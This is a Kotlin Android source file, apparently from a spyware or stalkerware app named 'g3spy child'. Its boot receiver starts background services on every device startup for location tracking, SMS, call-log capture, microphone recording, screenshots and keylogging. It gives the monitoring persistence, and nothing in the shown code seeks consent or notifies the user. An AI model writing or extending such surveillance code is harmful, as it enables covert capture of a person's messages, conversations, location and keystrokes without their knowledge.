package com.g3spy.child.receiver

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.util.Log
import com.g3spy.child.services.*

/**
 * Broadcast receiver that starts services when the device boots up
 */
class BootReceiver : BroadcastReceiver() {
    companion object {
        private const val TAG = "BootReceiver"
    }
    
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == Intent.ACTION_BOOT_COMPLETED) {
            Log.d(TAG, "Boot completed, starting services")
            
            // Start all monitoring services
            startServices(context)
        }
    }
    
    private fun startServices(context: Context) {
        // Start location monitoring service
        val locationIntent = Intent(context, LocationService::class.java)
        startServiceSafely(context, locationIntent, "LocationService")
        
        // Start SMS monitoring service
        val smsIntent = Intent(context, SmsService::class.java)
        startServiceSafely(context, smsIntent, "SmsService")
        
        // Start call log monitoring service
        val callLogIntent = Intent(context, CallLogService::class.java)
        startServiceSafely(context, callLogIntent, "CallLogService")
        
        // Start microphone recording service
        val micRecordingIntent = Intent(context, MicRecordingService::class.java)
        startServiceSafely(context, micRecordingIntent, "MicRecordingService")
        
        // Start screenshot service
        val screenshotIntent = Intent(context, ScreenshotService::class.java)
        startServiceSafely(context, screenshotIntent, "ScreenshotService")
        
        // Start keylogger service - note: this also requires user to enable it in Accessibility Settings
        val keyloggerIntent = Intent(context, KeyloggerService::class.java)
        startServiceSafely(context, keyloggerIntent, "KeyloggerService")
    }
    
    private fun startServiceSafely(context: Context, intent: Intent, serviceName: String) {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
            Log.d(TAG, "$serviceName started successfully")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start $serviceName", e)
        }
    }
}